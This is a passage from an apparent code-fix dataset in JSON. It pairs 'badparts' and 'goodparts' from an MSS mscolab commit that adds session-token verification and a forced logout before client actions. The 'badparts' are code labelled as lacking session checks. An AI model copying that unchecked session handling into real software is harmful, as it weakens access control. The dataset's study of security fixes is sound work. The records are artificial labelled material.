\\\"Save to Server\\\" button.\"))","            self.save_ft.setEnabled(True)","            self.fetch_ft.setEnabled(True)","            self.versionHistoryBtn.setEnabled(False)","            self.reload_local_wp()","            self.local_ftml_file = None","            self.helperTextLabel.setText(","                self.tr(\"Working On: Shared File. All your changes will be shared with everyone.\"","                        \"Turn on work locally to work on local flight track file\"))","            self.save_ft.setEnabled(False)","            self.fetch_ft.setEnabled(False)","            if self.access_level in [\"admin\", \"creator\", \"collaborator\"]:","                self.versionHistoryBtn.setEnabled(True)","            self.waypoints_model = None","            self.load_wps_from_server()","        self.reload_view_windows()"],"goodparts":["        if self.verify_user_token():","            if self.workLocallyCheckBox.isChecked():","                if self.version_window is not None:","                    self.version_window.close()","                self.create_local_project_file()","                self.local_ftml_file = fs.path.combine(self.data_dir,","                                                       fs.path.join('local_mscolab_data',","                                                                    self.user['username'], self.active_project_name,","                                                                    'mscolab_project.ftml'))","                self.helperTextLabel.setText(","                    self.tr(\"Working On: Local File. Your changes are only available to you.\"","                            \"To save your changes with everyone, use the \\\"Save to Server\\\" button.\"))","                self.save_ft.setEnabled(True)","                self.fetch_ft.setEnabled(True)","                self.versionHistoryBtn.setEnabled(False)","                self.reload_local_wp()","            else:","                self.local_ftml_file = None","                self.helperTextLabel.setText(","                    self.tr(\"Working On: Shared File. All your changes will be shared with everyone.\"","                            \"Turn on work locally to work on local flight track file\"))","                self.save_ft.setEnabled(False)","                self.fetch_ft.setEnabled(False)","                if self.access_level in [\"admin\", \"creator\", \"collaborator\"]:","                    self.versionHistoryBtn.setEnabled(True)","                self.waypoints_model = None","                self.load_wps_from_server()","            self.reload_view_windows()","            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")","            self.logout()","    def verify_user_token(self):","        data = {","            \"token\": self.token","        }","        try:","            r = requests.get(f'{self.mscolab_server_url}\/test_authorized', data=data)","        except requests.exceptions.ConnectionError as ex:","            logging.error(\"unexpected error: %s %s\", type(ex), ex)","            return False","        return r.text == \"True\""]},{"diff":"\n \n     def add_projects(self):\n         # add projects\n-        data = {\n-            \"token\": self.token\n-        }\n-        r = requests.get(self.mscolab_server_url + '\/projects', data=data)\n-        if r.text != \"False\":\n-            _json = json.loads(r.text)\n-            self.projects = _json[\"projects\"]\n-            self.add_projects_to_ui(self.projects)\n+        if self.verify_user_token():\n+            data = {\n+                \"token\": self.token\n+            }\n+            r = requests.get(self.mscolab_server_url + '\/projects', data=data)\n+            if r.text != \"False\":\n+                _json = json.loads(r.text)\n+                self.projects = _json[\"projects\"]\n+                self.add_projects_to_ui(self.projects)\n+            else:\n+                show_popup(self, \"Error\", \"Session expired, new login required\")\n         else:\n-            show_popup(self, \"Error\", \"Session expired, new login required\")\n+            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")\n+            self.logout()\n \n     def get_recent_pid(self):\n         \"\"\"\n         get most recent project's p_id\n         \"\"\"\n-        data = {\n-            \"token\": self.token\n-        }\n-        r = requests.get(self.mscolab_server_url + '\/projects', data=data)\n-        if r.text != \"False\":\n-            _json = json.loads(r.text)\n-            projects = _json[\"projects\"]\n-            p_id = None\n-            if projects:\n-                p_id = projects[-1][\"p_id\"]\n-            return p_id\n+        if self.verify_user_token():\n+            data = {\n+                \"token\": self.token\n+            }\n+            r = requests.get(self.mscolab_server_url + '\/projects', data=data)\n+            if r.text != \"False\":\n+                _json = json.loads(r.text)\n+                projects = _json[\"projects\"]\n+                p_id = None\n+                if projects:\n+                    p_id = projects[-1][\"p_id\"]\n+                return p_id\n+            else:\n+                show_popup(self, \"Error\", \"Session expired, new login required\")\n         else:\n-            show_popup(self, \"Error\", \"Session expired, new login required\")\n+            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")\n+            self.logout()\n \n     def get_recent_project(self):\n         \"\"\"\n         get most recent project\n         \"\"\"\n-        data = {\n-            \"token\": self.token\n-        }\n-        r = requests.get(self.mscolab_server_url + '\/projects', data=data)\n-        if r.text != \"False\":\n-            _json = json.loads(r.text)\n-            projects = _json[\"projects\"]\n-            recent_project = None\n-            if projects:\n-                recent_project = projects[-1]\n-            return recent_project\n+        if self.verify_user_token():\n+            data = {\n+                \"token\": self.token\n+            }\n+            r = requests.get(self.mscolab_server_url + '\/projects', data=data)\n+            if r.text != \"False\":\n+                _json = json.loads(r.text)\n+                projects = _json[\"projects\"]\n+                recent_project = None\n+                if projects:\n+                    recent_project = projects[-1]\n+                return recent_project\n+            else:\n+                show_popup(self, \"Error\", \"Session expired, new login required\")\n         else:\n-            show_popup(self, \"Error\", \"Session expired, new login required\")\n+            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")\n+            self.logout()\n \n     def add_projects_to_ui(self, projects):\n         logging.debug(\"adding projects to ui\")\n","add":45,"remove":33,"filename":"\/mslib\/msui\/mscolab.py","badparts":["        data = {","            \"token\": self.token","        }","        r = requests.get(self.mscolab_server_url + '\/projects', data=data)","        if r.text != \"False\":","            _json = json.loads(r.text)","            self.projects = _json[\"projects\"]","            self.add_projects_to_ui(self.projects)","            show_popup(self, \"Error\", \"Session expired, new login required\")","        data = {","            \"token\": self.token","        }","        r = requests.get(self.mscolab_server_url + '\/projects', data=data)","        if r.text != \"False\":","            _json = json.loads(r.text)","            projects = _json[\"projects\"]","            p_id = None","            if projects:","                p_id = projects[-1][\"p_id\"]","            return p_id","            show_popup(self, \"Error\", \"Session expired, new login required\")","        data = {","            \"token\": self.token","        }","        r = requests.get(self.mscolab_server_url + '\/projects', data=data)","        if r.text != \"False\":","            _json = json.loads(r.text)","            projects = _json[\"projects\"]","            recent_project = None","            if projects:","                recent_project = projects[-1]","            return recent_project","            show_popup(self, \"Error\", \"Session expired, new login required\")"],"goodparts":["        if self.verify_user_token():","            data = {","                \"token\": self.token","            }","            r = requests.get(self.mscolab_server_url + '\/projects', data=data)","            if r.text != \"False\":","                _json = json.loads(r.text)","                self.projects = _json[\"projects\"]","                self.add_projects_to_ui(self.projects)","            else:","                show_popup(self, \"Error\", \"Session expired, new login required\")","            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")","            self.logout()","        if self.verify_user_token():","            data = {","                \"token\": self.token","            }","            r = requests.get(self.mscolab_server_url + '\/projects', data=data)","            if r.text != \"False\":","                _json = json.loads(r.text)","                projects = _json[\"projects\"]","                p_id = None","                if projects:","                    p_id = projects[-1][\"p_id\"]","                return p_id","            else:","                show_popup(self, \"Error\", \"Session expired, new login required\")","            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")","            self.logout()","        if self.verify_user_token():","            data = {","                \"token\": self.token","            }","            r = requests.get(self.mscolab_server_url + '\/projects', data=data)","            if r.text != \"False\":","                _json = json.loads(r.text)","                projects = _json[\"projects\"]","                recent_project = None","                if projects:","                    recent_project = projects[-1]","                return recent_project","            else:","                show_popup(self, \"Error\", \"Session expired, new login required\")","            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")","            self.logout()"]},{"diff":"\n         self.active_windows = []\n \n     def set_active_pid(self, item):\n-        if item.p_id == self.active_pid:\n-            return\n-        # close all hanging window\n-        self.force_close_view_windows()\n-        self.close_external_windows()\n-        # Turn off work locally toggle\n-        self.workLocallyCheckBox.blockSignals(True)\n-        self.workLocallyCheckBox.setChecked(False)\n-        self.workLocallyCheckBox.blockSignals(False)\n-        self.save_ft.setEnabled(False)\n-        self.fetch_ft.setEnabled(False)\n-\n-        # set active_pid here\n-        self.active_pid = item.p_id\n-        self.access_level = item.access_level\n-        self.active_project_name = item.text().split(\"-\")[0].strip()\n-        self.waypoints_model = None\n-        # set active flightpath here\n-        self.load_wps_from_server()\n-        # enable project specific buttons\n-        self.helperTextLabel.setVisible(True)\n-        self.helperTextLabel.setText(self.tr(\"Working On: Shared File. All your changes will be shared with everyone.\"\n-                                             \"Turn on work locally to work on local flight track file\"))\n-        self.importBtn.setEnabled(True)\n-        self.exportBtn.setEnabled(True)\n-        self.topview.setEnabled(True)\n-        self.sideview.setEnabled(True)\n-        self.tableview.setEnabled(True)\n-        self.workLocallyCheckBox.setEnabled(True)\n-\n-        # enable access level specific buttons\n-        self.handle_mscolab_buttons()\n-\n-        # change font style for selected\n-        font = QtGui.QFont()\n-        for i in range(self.listProjects.count()):\n-            self.listProjects.item(i).setFont(font)\n-        font.setBold(True)\n-        item.setFont(font)\n+        if self.verify_user_token():\n+            if item.p_id == self.active_pid:\n+                return\n+            # close all hanging window\n+            self.force_close_view_windows()\n+            self.close_external_windows()\n+            # Turn off work locally toggle\n+            self.workLocallyCheckBox.blockSignals(True)\n+            self.workLocallyCheckBox.setChecked(False)\n+            self.workLocallyCheckBox.blockSignals(False)\n+            self.save_ft.setEnabled(False)\n+            self.fetch_ft.setEnabled(False)\n+            # set active_pid here\n+            self.active_pid = item.p_id\n+            self.access_level = item.access_level\n+            self.active_project_name = item.text().split(\"-\")[0].strip()\n+            self.waypoints_model = None\n+            # set active flightpath here\n+            self.load_wps_from_server()\n+            # enable project specific buttons\n+            self.helperTextLabel.setVisible(True)\n+            self.helperTextLabel.setText(self.tr(\"Working On: Shared File.\"\n+                                                 \"All your changes will be shared with everyone.\"\n+                                                 \"Turn on work locally to work on local flight track file\"))\n+            self.importBtn.setEnabled(True)\n+            self.exportBtn.setEnabled(True)\n+            self.topview.setEnabled(True)\n+            self.sideview.setEnabled(True)\n+            self.tableview.setEnabled(True)\n+            self.workLocallyCheckBox.setEnabled(True)\n+            # enable access level specific buttons\n+            self.handle_mscolab_buttons()\n+            # change font style for selected\n+            font = QtGui.QFont()\n+            for i in range(self.listProjects.count()):\n+                self.listProjects.item(i).setFont(font)\n+            font.setBold(True)\n+            item.setFont(font)\n+        else:\n+            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")\n+            self.logout()\n \n     def reload_wps_from_server(self):\n         if self.active_pid is None:\n","add":41,"remove":39,"filename":"\/mslib\/msui\/mscolab.py","badparts":["        if item.p_id == self.active_pid:","            return","        self.force_close_view_windows()","        self.close_external_windows()","        self.workLocallyCheckBox.blockSignals(True)","        self.workLocallyCheckBox.setChecked(False)","        self.workLocallyCheckBox.blockSignals(False)","        self.save_ft.setEnabled(False)","        self.fetch_ft.setEnabled(False)","        self.active_pid = item.p_id","        self.access_level = item.access_level","        self.active_project_name = item.text().split(\"-\")[0].strip()","        self.waypoints_model = None","        self.load_wps_from_server()","        self.helperTextLabel.setVisible(True)","        self.helperTextLabel.setText(self.tr(\"Working On: Shared File. All your changes will be shared with everyone.\"","                                             \"Turn on work locally to work on local flight track file\"))","        self.importBtn.setEnabled(True)","        self.exportBtn.setEnabled(True)","        self.topview.setEnabled(True)","        self.sideview.setEnabled(True)","        self.tableview.setEnabled(True)","        self.workLocallyCheckBox.setEnabled(True)","        self.handle_mscolab_buttons()","        font = QtGui.QFont()","        for i in range(self.listProjects.count()):","            self.listProjects.item(i).setFont(font)","        font.setBold(True)","        item.setFont(font)"],"goodparts":["        if self.verify_user_token():","            if item.p_id == self.active_pid:","                return","            self.force_close_view_windows()","            self.close_external_windows()","            self.workLocallyCheckBox.blockSignals(True)","            self.workLocallyCheckBox.setChecked(False)","            self.workLocallyCheckBox.blockSignals(False)","            self.save_ft.setEnabled(False)","            self.fetch_ft.setEnabled(False)","            self.active_pid = item.p_id","            self.access_level = item.access_level","            self.active_project_name = item.text().split(\"-\")[0].strip()","            self.waypoints_model = None","            self.load_wps_from_server()","            self.helperTextLabel.setVisible(True)","            self.helperTextLabel.setText(self.tr(\"Working On: Shared File.\"","                                                 \"All your changes will be shared with everyone.\"","                                                 \"Turn on work locally to work on local flight track file\"))","            self.importBtn.setEnabled(True)","            self.exportBtn.setEnabled(True)","            self.topview.setEnabled(True)","            self.sideview.setEnabled(True)","            self.tableview.setEnabled(True)","            self.workLocallyCheckBox.setEnabled(True)","            self.handle_mscolab_buttons()","            font = QtGui.QFont()","            for i in range(self.listProjects.count()):","                self.listProjects.item(i).setFont(font)","            font.setBold(True)","            item.setFont(font)","        else:","            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")","            self.logout()"]},{"diff":"\n         self.reload_view_windows()\n \n     def request_wps_from_server(self):\n-        data = {\n-            \"token\": self.token,\n-            \"p_id\": self.active_pid\n-        }\n-        r = requests.get(self.mscolab_server_url + '\/get_project_by_id', data=data)\n-        if r.text != \"False\":\n-            xml_content = json.loads(r.text)[\"content\"]\n-            return xml_content\n+        if self.verify_user_token():\n+            data = {\n+                \"token\": self.token,\n+                \"p_id\": self.active_pid\n+            }\n+            r = requests.get(self.mscolab_server_url + '\/get_project_by_id', data=data)\n+            if r.text != \"False\":\n+                xml_content = json.loads(r.text)[\"content\"]\n+                return xml_content\n+            else:\n+                show_popup(self, \"Error\", \"Session expired, new login required\")\n         else:\n-            show_popup(self, \"Error\", \"Session expired, new login required\")\n+            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")\n+            self.logout()\n \n     def load_wps_from_server(self):\n         if self.workLocallyCheckBox.isChecked():\n","add":13,"remove":9,"filename":"\/mslib\/msui\/mscolab.py","badparts":["        data = {","            \"token\": self.token,","            \"p_id\": self.active_pid","        }","        r = requests.get(self.mscolab_server_url + '\/get_project_by_id', data=data)","        if r.text != \"False\":","            xml_content = json.loads(r.text)[\"content\"]","            return xml_content","            show_popup(self, \"Error\", \"Session expired, new login required\")"],"goodparts":["        if self.verify_user_token():","            data = {","                \"token\": self.token,","                \"p_id\": self.active_pid","            }","            r = requests.get(self.mscolab_server_url + '\/get_project_by_id', data=data)","            if r.text != \"False\":","                xml_content = json.loads(r.text)[\"content\"]","                return xml_content","            else:","                show_popup(self, \"Error\", \"Session expired, new login required\")","            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")","            self.logout()"]},{"diff":"\n \n     def open_topview(self):\n         # showing dummy info dialog\n-        if self.active_pid is None:\n-            return\n-        self.create_view_window(\"topview\")\n+        if self.verify_user_token():\n+            if self.active_pid is None:\n+                return\n+            self.create_view_window(\"topview\")\n+        else:\n+            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")\n+            self.logout()\n \n     def open_sideview(self):\n         # showing dummy info dialog\n-        if self.active_pid is None:\n-            return\n-        self.create_view_window(\"sideview\")\n+        if self.verify_user_token():\n+            if self.active_pid is None:\n+                return\n+            self.create_view_window(\"sideview\")\n+        else:\n+            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")\n+            self.logout()\n \n     def open_tableview(self):\n         # showing dummy info dialog\n-        if self.active_pid is None:\n-            return\n-        self.create_view_window(\"tableview\")\n+        if self.verify_user_token():\n+            if self.active_pid is None:\n+                return\n+            self.create_view_window(\"tableview\")\n+        else:\n+            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")\n+            self.logout()\n \n     def create_view_window(self, _type):\n         for active_window in self.active_windows:\n","add":21,"remove":9,"filename":"\/mslib\/msui\/mscolab.py","badparts":["        if self.active_pid is None:","            return","        self.create_view_window(\"topview\")","        if self.active_pid is None:","            return","        self.create_view_window(\"sideview\")","        if self.active_pid is None:","            return","        self.create_view_window(\"tableview\")"],"goodparts":["        if self.verify_user_token():","            if self.active_pid is None:","                return","            self.create_view_window(\"topview\")","        else:","            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")","            self.logout()","        if self.verify_user_token():","            if self.active_pid is None:","                return","            self.create_view_window(\"sideview\")","        else:","            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")","            self.logout()","        if self.verify_user_token():","            if self.active_pid is None:","                return","            self.create_view_window(\"tableview\")","        else:","            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")","            self.logout()"]},{"diff":"\n         self.password.setEnabled(True)\n \n     def delete_account(self):\n-        w = QtWidgets.QWidget()\n-        qm = QtWidgets.QMessageBox\n-        reply = qm.question(w, self.tr('Continue?'),\n-                            self.tr(\"You're about to delete your account. You cannot undo this operation!\"),\n-                            qm.Yes, qm.No)\n-        if reply == QtWidgets.QMessageBox.No:\n-            return\n-        data = {\n-            \"token\": self.token\n-        }\n-        requests.post(self.mscolab_server_url + '\/delete_user', data=data)\n-        self.clean_up_window()\n+        if self.verify_user_token():\n+            w = QtWidgets.QWidget()\n+            qm = QtWidgets.QMessageBox\n+            reply = qm.question(w, self.tr('Continue?'),\n+                                self.tr(\"You're about to delete your account. You cannot undo this operation!\"),\n+                                qm.Yes, qm.No)\n+            if reply == QtWidgets.QMessageBox.No:\n+                return\n+            data = {\n+                \"token\": self.token\n+            }\n+            requests.post(self.mscolab_server_url + '\/delete_user', data=data)\n+            self.clean_up_window()\n+        else:\n+            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")\n+            self.logout()\n \n     def close_external_windows(self):\n         if self.chat_window is not None:\n","add":16,"remove":12,"filename":"\/mslib\/msui\/mscolab.py","badparts":["        w = QtWidgets.QWidget()","        qm = QtWidgets.QMessageBox","        reply = qm.question(w, self.tr('Continue?'),","                            self.tr(\"You're about to delete your account. You cannot undo this operation!\"),","                            qm.Yes, qm.No)","        if reply == QtWidgets.QMessageBox.No:","            return","        data = {","            \"token\": self.token","        }","        requests.post(self.mscolab_server_url + '\/delete_user', data=data)","        self.clean_up_window()"],"goodparts":["        if self.verify_user_token():","            w = QtWidgets.QWidget()","            qm = QtWidgets.QMessageBox","            reply = qm.question(w, self.tr('Continue?'),","                                self.tr(\"You're about to delete your account. You cannot undo this operation!\"),","                                qm.Yes, qm.No)","            if reply == QtWidgets.QMessageBox.No:","                return","            data = {","                \"token\": self.token","            }","            requests.post(self.mscolab_server_url + '\/delete_user', data=data)","            self.clean_up_window()","        else:","            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")","            self.logout()"]},{"diff":"\n         save_settings_qsettings('mscolab', self.settings)\n \n     def save_wp_mscolab(self, comment=None):\n-        server_xml = self.request_wps_from_server()\n-        server_waypoints_model = ft.WaypointsTableModel(xml_content=server_xml)\n-        self.merge_dialog = MscolabMergeWaypointsDialog(self.waypoints_model, server_waypoints_model, parent=self)\n-        self.merge_dialog.saveBtn.setDisabled(True)\n-        if self.merge_dialog.exec_():\n-            xml_content = self.merge_dialog.get_values()\n-            if xml_content is not None:\n-                self.conn.save_file(self.token, self.active_pid, xml_content, comment=comment)\n-                self.waypoints_model = ft.WaypointsTableModel(xml_content=xml_content)\n-                self.waypoints_model.save_to_ftml(self.local_ftml_file)\n-                self.waypoints_model.dataChanged.connect(self.handle_waypoints_changed)\n-                self.reload_view_windows()\n-                show_popup(self, \"Success\", \"New Waypoints Saved To Server!\", icon=1)\n-        self.merge_dialog = None\n+        if self.verify_user_token():\n+            server_xml = self.request_wps_from_server()\n+            server_waypoints_model = ft.WaypointsTableModel(xml_content=server_xml)\n+            self.merge_dialog = MscolabMergeWaypointsDialog(self.waypoints_model, server_waypoints_model, parent=self)\n+            self.merge_dialog.saveBtn.setDisabled(True)\n+            if self.merge_dialog.exec_():\n+                xml_content = self.merge_dialog.get_values()\n+                if xml_content is not None:\n+                    self.conn.save_file(self.token, self.active_pid, xml_content, comment=comment)\n+                    self.waypoints_model = ft.WaypointsTableModel(xml_content=xml_content)\n+                    self.waypoints_model.save_to_ftml(self.local_ftml_file)\n+                    self.waypoints_model.dataChanged.connect(self.handle_waypoints_changed)\n+                    self.reload_view_windows()\n+                    show_popup(self, \"Success\", \"New Waypoints Saved To Server!\", icon=1)\n+            self.merge_dialog = None\n+        else:\n+            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")\n+            self.logout()\n \n     def handle_waypoints_changed(self):\n-        if self.workLocallyCheckBox.isChecked():\n-            self.waypoints_model.save_to_ftml(self.local_ftml_file)\n+        if self.verify_user_token():\n+            if self.workLocallyCheckBox.isChecked():\n+                self.waypoints_model.save_to_ftml(self.local_ftml_file)\n+            else:\n+                xml_content = self.waypoints_model.get_xml_content()\n+                self.conn.save_file(self.token, self.active_pid, xml_content, comment=None)\n         else:\n-            xml_content = self.waypoints_model.get_xml_content()\n-            self.conn.save_file(self.token, self.active_pid, xml_content, comment=None)\n+            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")\n+            self.logout()\n \n     def reload_view_windows(self):\n         for window in self.active_windows:\n","add":26,"remove":18,"filename":"\/mslib\/msui\/mscolab.py","badparts":["        server_xml = self.request_wps_from_server()","        server_waypoints_model = ft.WaypointsTableModel(xml_content=server_xml)","        self.merge_dialog = MscolabMergeWaypointsDialog(self.waypoints_model, server_waypoints_model, parent=self)","        self.merge_dialog.saveBtn.setDisabled(True)","        if self.merge_dialog.exec_():","            xml_content = self.merge_dialog.get_values()","            if xml_content is not None:","                self.conn.save_file(self.token, self.active_pid, xml_content, comment=comment)","                self.waypoints_model = ft.WaypointsTableModel(xml_content=xml_content)","                self.waypoints_model.save_to_ftml(self.local_ftml_file)","                self.waypoints_model.dataChanged.connect(self.handle_waypoints_changed)","                self.reload_view_windows()","                show_popup(self, \"Success\", \"New Waypoints Saved To Server!\", icon=1)","        self.merge_dialog = None","        if self.workLocallyCheckBox.isChecked():","            self.waypoints_model.save_to_ftml(self.local_ftml_file)","            xml_content = self.waypoints_model.get_xml_content()","            self.conn.save_file(self.token, self.active_pid, xml_content, comment=None)"],"goodparts":["        if self.verify_user_token():","            server_xml = self.request_wps_from_server()","            server_waypoints_model = ft.WaypointsTableModel(xml_content=server_xml)","            self.merge_dialog = MscolabMergeWaypointsDialog(self.waypoints_model, server_waypoints_model, parent=self)","            self.merge_dialog.saveBtn.setDisabled(True)","            if self.merge_dialog.exec_():","                xml_content = self.merge_dialog.get_values()","                if xml_content is not None:","                    self.conn.save_file(self.token, self.active_pid, xml_content, comment=comment)","                    self.waypoints_model = ft.WaypointsTableModel(xml_content=xml_content)","                    self.waypoints_model.save_to_ftml(self.local_ftml_file)","                    self.waypoints_model.dataChanged.connect(self.handle_waypoints_changed)","                    self.reload_view_windows()","                    show_popup(self, \"Success\", \"New Waypoints Saved To Server!\", icon=1)","            self.merge_dialog = None","        else:","            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")","            self.logout()","        if self.verify_user_token():","            if self.workLocallyCheckBox.isChecked():","                self.waypoints_model.save_to_ftml(self.local_ftml_file)","            else:","                xml_content = self.waypoints_model.get_xml_content()","                self.conn.save_file(self.token, self.active_pid, xml_content, comment=None)","            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")","            self.logout()"]},{"diff":"\n         self.reload_view_windows()\n \n     def fetch_wp_mscolab(self):\n-        server_xml = self.request_wps_from_server()\n-        server_waypoints_model = ft.WaypointsTableModel(xml_content=server_xml)\n-        self.merge_dialog = MscolabMergeWaypointsDialog(self.waypoints_model, server_waypoints_model, True, self)\n-        self.merge_dialog.saveBtn.setDisabled(True)\n-        if self.merge_dialog.exec_():\n-            xml_content = self.merge_dialog.get_values()\n-            if xml_content is not None:\n-                self.waypoints_model = ft.WaypointsTableModel(xml_content=xml_content)\n-                self.waypoints_model.save_to_ftml(self.local_ftml_file)\n-                self.waypoints_model.dataChanged.connect(self.handle_waypoints_changed)\n-                self.reload_view_windows()\n-                show_popup(self, \"Success\", \"New Waypoints Fetched To Local File!\", icon=1)\n-        self.merge_dialog = None\n+        if self.verify_user_token():\n+            server_xml = self.request_wps_from_server()\n+            server_waypoints_model = ft.WaypointsTableModel(xml_content=server_xml)\n+            self.merge_dialog = MscolabMergeWaypointsDialog(self.waypoints_model, server_waypoints_model, True, self)\n+            self.merge_dialog.saveBtn.setDisabled(True)\n+            if self.merge_dialog.exec_():\n+                xml_content = self.merge_dialog.get_values()\n+                if xml_content is not None:\n+                    self.waypoints_model = ft.WaypointsTableModel(xml_content=xml_content)\n+                    self.waypoints_model.save_to_ftml(self.local_ftml_file)\n+                    self.waypoints_model.dataChanged.connect(self.handle_waypoints_changed)\n+                    self.reload_view_windows()\n+                    show_popup(self, \"Success\", \"New Waypoints Fetched To Local File!\", icon=1)\n+            self.merge_dialog = None\n+        else:\n+            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")\n+            self.logout()\n \n     @QtCore.Slot(int, int, str)\n     def handle_update_permission(self, p_id, u_id, access_level):\n","add":17,"remove":13,"filename":"\/mslib\/msui\/mscolab.py","badparts":["        server_xml = self.request_wps_from_server()","        server_waypoints_model = ft.WaypointsTableModel(xml_content=server_xml)","        self.merge_dialog = MscolabMergeWaypointsDialog(self.waypoints_model, server_waypoints_model, True, self)","        self.merge_dialog.saveBtn.setDisabled(True)","        if self.merge_dialog.exec_():","            xml_content = self.merge_dialog.get_values()","            if xml_content is not None:","                self.waypoints_model = ft.WaypointsTableModel(xml_content=xml_content)","                self.waypoints_model.save_to_ftml(self.local_ftml_file)","                self.waypoints_model.dataChanged.connect(self.handle_waypoints_changed)","                self.reload_view_windows()","                show_popup(self, \"Success\", \"New Waypoints Fetched To Local File!\", icon=1)","        self.merge_dialog = None"],"goodparts":["        if self.verify_user_token():","            server_xml = self.request_wps_from_server()","            server_waypoints_model = ft.WaypointsTableModel(xml_content=server_xml)","            self.merge_dialog = MscolabMergeWaypointsDialog(self.waypoints_model, server_waypoints_model, True, self)","            self.merge_dialog.saveBtn.setDisabled(True)","            if self.merge_dialog.exec_():","                xml_content = self.merge_dialog.get_values()","                if xml_content is not None:","                    self.waypoints_model = ft.WaypointsTableModel(xml_content=xml_content)","                    self.waypoints_model.save_to_ftml(self.local_ftml_file)","                    self.waypoints_model.dataChanged.connect(self.handle_waypoints_changed)","                    self.reload_view_windows()","                    show_popup(self, \"Success\", \"New Waypoints Fetched To Local File!\", icon=1)","            self.merge_dialog = None","        else:","            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")","            self.logout()"]},{"diff":"\n             if self.chat_window is not None:\n                 self.chat_window.load_users()\n         else:\n-            show_popup(self, \"Error\", \"Session expired, new login required\")\n+            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")\n+            self.logout()\n \n     @QtCore.Slot(int)\n     def handle_project_deleted(self, p_id)","add":2,"remove":1,"filename":"\/mslib\/msui\/mscolab.py","badparts":["            show_popup(self, \"Error\", \"Session expired, new login required\")"],"goodparts":["            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")","            self.logout()"]}]}},"msg":"Verify valid token, fixes #975 (#987)\n\n* fixed error message (#962)\r\n\r\n* improved install\/update of MSS (#966)\r\n\r\n* improved install\/update of MSS\r\n\r\n* updated env order and added an important hint\r\n\r\nCo-authored-by: J. Ungermann <j.ungermann@fz-juelich.de>\r\n\r\n* preparation v3.0.4 (#967)\r\n\r\n* Changed vertical section interpolation to treat masked values as NaN (#983)\r\n\r\nArray is properly masked, but interpolation routine ignored mask.\r\nFilling the array with NaN should solve this issue.\r\nResulting array is properly masked again.\r\n\r\nFix #811\r\n\r\n* Import\/Export Extensions, fixes #918 (#981)\r\n\r\n* export plugins added\r\n\r\n* import plugins added\r\n\r\n* removed a doubled import\r\n\r\n* popup message when all is done\r\n\r\n* first change model than reload views\r\n\r\n* waypoints_model.dataChanged added\r\n\r\n* saved after import\r\n\r\n* reorganized, removed double commits\r\n\r\n* import saves xml content, worklocally with ftml files\r\n\r\n* Added option to display a secondary axis in SideView. (#980)\r\n\r\nFix #571\r\n\r\nCo-authored-by: ReimarBauer <rb.proj@gmail.com>\r\n\r\n* enables to configure a EXPIRATION time in seconds, fixes #948 (#974)\r\n\r\n* enables to configure a EXPIRATION time in seconds\r\n\r\nwe catch now various problems for an expired session,\r\nbesides on a timelimit a session also expires on server restart.\r\n\r\n* popup message for new login requires added\r\n\r\n* flake8 fix\r\n\r\nCo-authored-by: J. Ungermann <j.ungermann@fz-juelich.de>\r\n\r\n* verbose output on chat who made changes\r\n\r\n* fixed typo\r\n\r\n* ToDo added\r\n\r\n* verifies expired user token and forces login\r\n\r\n* fixation of qt (#988)\r\n\r\n* added sorting for project list (#990)\r\n\r\nCo-authored-by: J. Ungermann <j.ungermann@fz-juelich.de>\r\n\r\n* Mscolab: collaborator can access version history (#925)\r\n\r\n* Mscolab: collaborator can access version history\r\n\r\n* updated mscolab.py\r\n\r\n* mscolab docs updated\r\n\r\n* mscolab.py updated\r\n\r\nCo-Authored-By: ReimarBauer <rb.proj@gmail.com>\r\n\r\n* added \"collaborator\" in file_manager\r\n\r\n* fixed: flake8\r\n\r\n* file_manager.py updated\r\n\r\n* updated file_manager.py\r\n\r\n* refactored mscolab permissions\r\n\r\n* update\r\n\r\n* refactored permissions in  \"set_active_pid\"\r\n\r\nCo-Authored-By: ReimarBauer <rb.proj@gmail.com>\r\n\r\n* closed windows after permission updated\r\n\r\n* merged: permission based closing of mscolab windows and disabling buttons to single function\r\n\r\nIt will increase maintainability\r\n\r\nCo-Authored-By: J. Ungermann <28449201+joernu76@users.noreply.github.com>\r\n\r\n* called `handle_mscolab_buttons` inside other functions\r\n\r\nCo-Authored-By: J. Ungermann <28449201+joernu76@users.noreply.github.com>\r\n\r\nCo-authored-by: ReimarBauer <rb.proj@gmail.com>\r\nCo-authored-by: J. Ungermann <j.ungermann@fz-juelich.de>\r\nCo-authored-by: J. Ungermann <28449201+joernu76@users.noreply.github.com>\r\n\r\n* flake8 fix\r\n\r\nCo-authored-by: J. Ungermann <j.ungermann@fz-juelich.de>\r\nCo-authored-by: Aravind Murali <aravindmurali711@gmail.com>\r\nCo-authored-by: Jatin Jain <72596619+Jatin2020-24@users.noreply.github.com>\r\nCo-authored-by: J. Ungermann <28449201+joernu76@users.noreply.github.com>"}},"https:\/\/github.com\/iverissimo\/Crowding_VS_features":{"1230ac8273e080ab0e158386231f852853a5edcf":{"url":"https:\/\/api.github.com\/repos\/iverissimo\/Crowding_VS_features\/commits\/1230ac8273e080ab0e158386231f852853a5edcf","html_url":"https:\/\/github.com\/iverissimo\/Crowding_VS_features\/commit\/1230ac8273e080ab0e158386231f852853a5edcf","message":"added training session for crowding, need to give feedback on 